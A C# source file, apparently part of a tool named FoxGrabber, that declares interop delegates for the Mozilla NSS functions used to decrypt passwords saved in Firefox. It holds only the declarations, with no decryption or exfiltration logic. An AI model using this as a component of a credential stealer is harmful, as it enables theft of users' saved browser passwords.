namespace FoxGrabber
{
    using System;
    using System.Runtime.InteropServices;
    using static FoxGrabber.Structures;

    internal static class Delegates
    {
        /*
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NSS_InitPtr(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long PK11_GetInternalKeySlotPtr();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

        */

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, string inStr, int inLen);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long PK11_GetInternalKeySlotPtr();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NSS_InitPtr(string path);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int NSS_ShutdownPtr();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int PK11_FreeSlotPtr(long slot);
    }
}